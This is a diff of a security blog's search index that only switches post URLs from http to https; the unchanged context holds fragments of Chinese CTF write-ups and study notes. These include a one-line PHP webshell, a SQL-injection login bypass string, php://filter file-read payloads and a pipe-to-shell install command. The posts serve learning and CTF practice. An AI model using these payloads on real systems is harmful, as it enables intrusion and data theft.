@@ -5,7 +5,7 @@
     
     <entry>
       <title><![CDATA[正方教务系统验证码识别]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB.html</url>
       <content type="html"><![CDATA[<h2 id="验证码预处理"><a href="#验证码预处理" class="headerlink" title="验证码预处理"></a>验证码预处理</h2><h3 id="下载验证码"><a href="#下载验证码" class="headerlink" title="下载验证码"></a>下载验证码</h3><h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_checkcode(i):</span><br><span class="line">    r = requests.get(&apos;http:///CheckCode.aspx?&apos;)</span><br><span class="line">    picname = str(i) + &apos;.png&apos;</span><br><span class="line">    with open(&apos;image\\&apos; + picname, &apos;wb&apos;) as f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">        print(&quot;downloading code %d.png&quot; % i,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        get_checkcode(i)</span><br></pre></td></tr></table></figure>
 <h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><ul>
 <li>利用requests库里的get方法访问生成验证码页面，并保存验证码图片到本地。</li>
@@ -58,7 +58,7 @@
     
     <entry>
       <title><![CDATA[solveme.peng.kr平台Web练习]]></title>
-      <url>http://uknowsec.cn/posts/notes/solveme-peng-kr%E5%B9%B3%E5%8F%B0Web%E7%BB%83%E4%B9%A0.html</url>
+      <url>https://uknowsec.cn/posts/notes/solveme-peng-kr%E5%B9%B3%E5%8F%B0Web%E7%BB%83%E4%B9%A0.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近自己的状态有点迷的，想学点代码审计的东西，又感觉自己的基础太菜。整个人昏昏沉沉的，偶尔逛freebuf看到一篇web题解的文章，</p>
 <p>作者在文章提到这个网站的Web题都是PHP审计的题目，于是看看代码，一行一行看代码，一个函数一个函数的理解。也写个题解记录以下。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &apos;&lt;hr&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
@@ -231,7 +231,7 @@
     
     <entry>
       <title><![CDATA[同源策略和跨域访问学习笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h4><p>所谓同源是值三个相同</p>
 <ul>
 <li>协议相同</li>
@@ -398,7 +398,7 @@
     
     <entry>
       <title><![CDATA[PHP爬虫-物业报修系统一键校园物业报修]]></title>
-      <url>http://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%A0%A1%E5%9B%AD%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE.html</url>
+      <url>https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%A0%A1%E5%9B%AD%E7%89%A9%E4%B8%9A%E6%8A%A5%E4%BF%AE.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面两个爬虫都是基于正方教务系统的，这个爬虫是根据学校的一个物业报修系统写的。</p>
 <p>login_baoxiu.php页面有用到一个js做的select二级联动的操作。</p>
 <p>require_baoxiu.php页面也就是三个post请求。</p>
@@ -445,7 +445,7 @@
     
     <entry>
       <title><![CDATA[PHP爬虫-正方教务系统一键报名四六级]]></title>
-      <url>http://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%8A%A5%E5%90%8D%E5%9B%9B%E5%85%AD%E7%BA%A7.html</url>
+      <url>https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E4%B8%80%E9%94%AE%E6%8A%A5%E5%90%8D%E5%9B%9B%E5%85%AD%E7%BA%A7.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我们学校四六级也是在正方教务系统进行报名的，login页面是跟查询成绩绩点的差不多，就是添加了几个表单数据。</p>
 <p>require页面中一点点区别，模拟登录和之前的成绩绩点爬取是一样的。在报名页面有个地方是很关键的。</p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="login-cet-php"><a href="#login-cet-php" class="headerlink" title="login_cet.php"></a>login_cet.php</h3><p>login_cet.php页面跟login_grade.php是差不多的，获取到cookie和验证码保存到本地。</p>
@@ -486,7 +486,7 @@
     
     <entry>
       <title><![CDATA[PHP爬虫-正方教务系统爬取成绩绩点]]></title>
-      <url>http://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%88%AC%E5%8F%96%E6%88%90%E7%BB%A9%E7%BB%A9%E7%82%B9.html</url>
+      <url>https://uknowsec.cn/posts/notes/PHP%E7%88%AC%E8%99%AB-%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F%E7%88%AC%E5%8F%96%E6%88%90%E7%BB%A9%E7%BB%A9%E7%82%B9.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从去年寒假开始，学校的一些二级域名就对外网访问进行了限制。而在校内同学们宿舍普遍是用的电信网，要使用内网需要到教学区域连学校的wifi才行。这样是很不方便的。</p>
 <p>寒假一直想写个正方教务系统爬虫的，一直拖着拖着的没有完成。开学这一段时间挺闲的，目前完成了正方教务系统爬取成绩绩点和另外两个小项目，一个是正方系统一键报名四六级，一个是物业报修系统一键物业报修。这三个爬虫目前挂在自己的个人服务器上，以某种手段访问内网，后续会转移到内网服务器，转发到外网，提高访问速度。</p>
 <p>习惯了，用博客记录自己写的东西，这里简单记录下正方教务系统爬虫成绩绩点的过程。</p>
@@ -548,7 +548,7 @@
     
     <entry>
       <title><![CDATA[Summary of 2017]]></title>
-      <url>http://uknowsec.cn/posts/life/Summary-of-2017.html</url>
+      <url>https://uknowsec.cn/posts/life/Summary-of-2017.html</url>
       <content type="html"><![CDATA[<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>2017年我从大二进入大三，算是在南京过了第一个大学暑假。我对暑假的实习生活有很多感慨，同时对我大三上学期这一年的感慨也挺多的。可能是因为大二下学期太久远了，以至于我都忘记我大二下学期都干了些什么了，记得实习那段时间过得挺辛苦的，每天挤着南京的早班地铁去公司。</p>
 <p>我第一感受到了自己的成长，就跟电视剧里看的那样穿着简单T恤，背着背包，挤着地铁。这种感觉很奇妙，就好像我第一次走进大学的校园那种感觉。那段时间习惯了早上拿上一瓶牛奶，口里咬着小面包，骑着小黄车去上班。下午在义乌的小摊小贩上打上一份普通的晚饭，同样是骑着小黄车汗流浃背的回到宿舍。</p>
 <p>暑假的后一个月，学校宿舍基本都是没人的，于是把音乐开外放到最大，放一曲民谣，洗完澡坐在椅子上刷刷手机。大学这几年爱上了民谣，一直都在听，手机里放的都是不知民的小歌手的民谣歌曲。因为我喜欢他们的小众，喜欢他们所叙说的简单故事，直截了当，简单明了。</p>
@@ -575,7 +575,7 @@
     
     <entry>
       <title><![CDATA[week 9 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt; &lt;?php </span><br><span class="line">$e = $_REQUEST[&apos;a&apos;]; </span><br><span class="line">$arr = array($_POST[&apos;b&apos;] =&gt; &apos;|.*|e&apos;,); </span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br></pre></td></tr></table></figure>
 <p>如上代码，是一个PHP木马。是可以用菜刀连接的。</p>
@@ -640,7 +640,7 @@
     
     <entry>
       <title><![CDATA[month 2 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>题目又是大写又是小写的，格式乱乱的，强迫症患了。</p>
 <p>整理下代码如下：</p>
@@ -716,7 +716,7 @@
     
     <entry>
       <title><![CDATA[week 7 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h4><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
 <h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</span><br></pre></td></tr></table></figure>
@@ -806,7 +806,7 @@
     
     <entry>
       <title><![CDATA[week 6 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="文件包含-10"><a href="#文件包含-10" class="headerlink" title="文件包含 10"></a>文件包含 10</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这个题目又是一个文件包含的题目，这里直接用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./key.php</span><br></pre></td></tr></table></figure>
@@ -838,7 +838,7 @@
     
     <entry>
       <title><![CDATA[week 5 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="躲猫猫-50"><a href="#躲猫猫-50" class="headerlink" title="躲猫猫 50"></a>躲猫猫 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这个题目又是一个文件包含的题目，这里直接用</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure>
@@ -901,7 +901,7 @@
     
     <entry>
       <title><![CDATA[month 1 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="签到-50"><a href="#签到-50" class="headerlink" title="签到 50"></a>签到 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="noopener">http://47.100.121.220:28001</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的题目，进入页面可以在相应头中找到flag。</p>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%93%8D%E5%BA%94%E5%A4%B4.png" alt=""></p>
@@ -971,7 +971,7 @@
     
     <entry>
       <title><![CDATA[week 3 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/week-3-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/week-3-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="login-50"><a href="#login-50" class="headerlink" title="login 50"></a>login 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="noopener">http://47.100.121.220:28001</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>一开始以为这个题是注入题，能从数据库中拿到flag,结果数据库里没有flag。结果群里的大佬说是简单的万能密码。</p>
 <p>user=admin’ or 1 #&amp;pass=1 绕过，得到源码。</p>
@@ -1010,7 +1010,7 @@
     
     <entry>
       <title><![CDATA[week 2 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="火星文-50"><a href="#火星文-50" class="headerlink" title="火星文 50"></a>火星文 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="noopener">http://47.100.121.220:28001/</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>看到题目就判断为javascript的题目，把火星人A和火星人B的内容复制粘贴到控制台</p>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%87.png" alt=""></p>
@@ -1167,7 +1167,7 @@
     
     <entry>
       <title><![CDATA[php内置过滤函数总结]]></title>
-      <url>http://uknowsec.cn/posts/notes/php%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/notes/php%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<p>PHP本身内置了很多参数过滤的函数，以方便开发者简单有效且统一地进行安全防护，而这些函数可以分为多种类型，如SQL注入过滤函数，XSS过滤函数，命令执行过滤函数，代码执行过滤函数等等。</p>
 <h2 id="SQL注入过滤函数"><a href="#SQL注入过滤函数" class="headerlink" title="SQL注入过滤函数"></a>SQL注入过滤函数</h2><p>SQL注入过滤函数有addslashes(),mysql_real_escape_string()以及mysql_escape_string(),它们的作用都是给字符串添加反斜杠（\）来转义掉单引号（’）、双引号（”）以及空格符NULL。</p>
 <p>addslashes()和mysql_escape_string()函数都是直接在敏感字符串前加反斜杠，可能会存在宽字节注入。可参考我之前的博客</p>
@@ -1285,7 +1285,7 @@
     
     <entry>
       <title><![CDATA[week 1 for cnas writeup]]></title>
-      <url>http://uknowsec.cn/posts/ctf/week-1-for-cnas-writeup.html</url>
+      <url>https://uknowsec.cn/posts/ctf/week-1-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天晚上在暑假实习部门群里，前辈说以后每周发三个CTF的题目，再加上自己最近也想做做CTF的题，遂早上起来把题目做了下，写下writeup记录。</p>
 <h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
 <h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的xss题，首先审查下元素，任意输入一个值。</p>
@@ -1344,7 +1344,7 @@
     
     <entry>
       <title><![CDATA[MySQL Error Based SQL Injection （报错注入）总结]]></title>
-      <url>http://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/notes/MySQL%20Error%20Based%20SQL%20Injection%20%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%89%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<h2 id="MySQL报错注入"><a href="#MySQL报错注入" class="headerlink" title="MySQL报错注入"></a>MySQL报错注入</h2><p>利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。</p>
 <p>数据类型转换报错是最常见的一种方法，在微软SQL Server上，利用的是convert()和cast()函数，MySQL的报错SQL注入方式更多。</p>
 <p>有很多函数都会导致MySQL报错并且显示出数据，它们分别是</p>
@@ -1421,7 +1421,7 @@
     
     <entry>
       <title><![CDATA[php支持的协议和封装协议小结]]></title>
-      <url>http://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html</url>
       <content type="html"><![CDATA[<h2 id="php协议类型"><a href="#php协议类型" class="headerlink" title="php协议类型"></a>php协议类型</h2><ul>
 <li>file:// — 访问本地文件系统</li>
 <li>http:// — 访问 HTTP(s) 网址</li>
@@ -1539,7 +1539,7 @@
     
     <entry>
       <title><![CDATA[Android App端与PHP Web端的简单数据交互实现]]></title>
-      <url>http://uknowsec.cn/posts/notes/Android-App%E7%AB%AF%E4%B8%8EPHP-Web%E7%AB%AF%E7%9A%84%E7%AE%80%E5%8D%95%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E5%AE%9E%E7%8E%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/Android-App%E7%AB%AF%E4%B8%8EPHP-Web%E7%AB%AF%E7%9A%84%E7%AE%80%E5%8D%95%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E5%AE%9E%E7%8E%B0.html</url>
       <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于学校科技立项的项目需要实现Android App端与PHP Web端的简单数据交互的实现，当前场景是Web端使用的是MySql数据库，Apache服务器和PHP语言编写的。数据交互的简单理解就是Android能向服务端进行数据获取，同时也能进行数据提交。</p>
 <h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/webandorid%E6%B5%81%E7%A8%8B%E5%9B%BE.png" alt=""></p>
 <h3 id="流程说明"><a href="#流程说明" class="headerlink" title="流程说明"></a>流程说明</h3><ul>
@@ -1581,7 +1581,7 @@
     
     <entry>
       <title><![CDATA[PHP MVC开发框架学习笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/PHP-MVC%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<h2 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h2><p>MVC模式（Model-View-Controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。</p>
 <p>PHP中MVC模式也称Web MVC，从上世纪70年代进化而来。MVC的目的是实现一种动态的程序设计，便于后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。除此之外，此模式通过对复杂度的简化，使程序结构更加直观。软件系统通过对自身基本部份分离的同时，也赋予了各个基本部分应有的功能。</p>
 <h3 id="MVC各部分的职能"><a href="#MVC各部分的职能" class="headerlink" title="MVC各部分的职能"></a>MVC各部分的职能</h3><p>MVC各部分的职能：</p>
@@ -1687,7 +1687,7 @@
     
     <entry>
       <title><![CDATA[PHP&JSON 学习笔记]]></title>
-      <url>http://uknowsec.cn/posts/notes/PHP-JSON-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+      <url>https://uknowsec.cn/posts/notes/PHP-JSON-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
       <content type="html"><![CDATA[<h2 id="JSON介绍"><a href="#JSON介绍" class="headerlink" title="JSON介绍"></a>JSON介绍</h2><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式</p>
 <h3 id="JSON格式"><a href="#JSON格式" class="headerlink" title="JSON格式"></a>JSON格式</h3><ul>
 <li>1） 并列的数据之间用逗号（”, “）分隔。</li>
@@ -1763,7 +1763,7 @@
     
     <entry>
       <title><![CDATA[Docker基础与实战]]></title>
-      <url>http://uknowsec.cn/posts/notes/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E6%88%98.html</url>
+      <url>https://uknowsec.cn/posts/notes/Docker%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%9E%E6%88%98.html</url>
       <content type="html"><![CDATA[<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>Linux中两种Docker安装方法，一种是使用Docker提供的自动安装脚本，另一种是使用Linux发行版的packaging system直接安装</p>
 <h3 id="自动安装脚本"><a href="#自动安装脚本" class="headerlink" title="自动安装脚本"></a>自动安装脚本</h3><p>Docker自动识别Linux发行版的类型，提供用于安装Docker包的脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget -q0- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
@@ -1844,7 +1844,7 @@
     
     <entry>
       <title><![CDATA[CRLF Injection漏洞利用与学习]]></title>
-      <url>http://uknowsec.cn/posts/notes/CRLF-Injection%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
+      <url>https://uknowsec.cn/posts/notes/CRLF-Injection%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
       <content type="html"><![CDATA[<h2 id="CRLF简介"><a href="#CRLF简介" class="headerlink" title="CRLF简介"></a>CRLF简介</h2><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="PHP-header-函数"><a href="#PHP-header-函数" class="headerlink" title="PHP header() 函数"></a>PHP header() 函数</h3><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
 <p>认识到一点很重要，即必须在任何实际的输出被发送之前调用 header() 函数（在 PHP 4 以及更高的版本中，您可以使用输出缓存来解决此问题）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 结果出错</span><br><span class="line">// 在调用 header() 之前已存在输出</span><br><span class="line">header(&apos;Location: http://www.example.com/&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
@@ -1915,7 +1915,7 @@
     
     <entry>
       <title><![CDATA[端口渗透总结]]></title>
-      <url>http://uknowsec.cn/posts/notes/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93.html</url>
+      <url>https://uknowsec.cn/posts/notes/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93.html</url>
       <content type="html"><![CDATA[<h2 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h2><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
 <p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
 <p>动态/私有：49152-65535，不为服务分配这些端口；</p>
@@ -2153,7 +2153,7 @@
     
     <entry>
       <title><![CDATA[Peach对Modbus功能码的模糊测试]]></title>
-      <url>http://uknowsec.cn/posts/notes/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.html</url>
+      <url>https://uknowsec.cn/posts/notes/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.html</url>
       <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Modbus功能码"><a href="#Modbus功能码" class="headerlink" title="Modbus功能码"></a>Modbus功能码</h3><table>
 <thead>
 <tr>
@@ -2402,7 +2402,7 @@
     
     <entry>
       <title><![CDATA[宽字节注入漏洞的利用与学习]]></title>
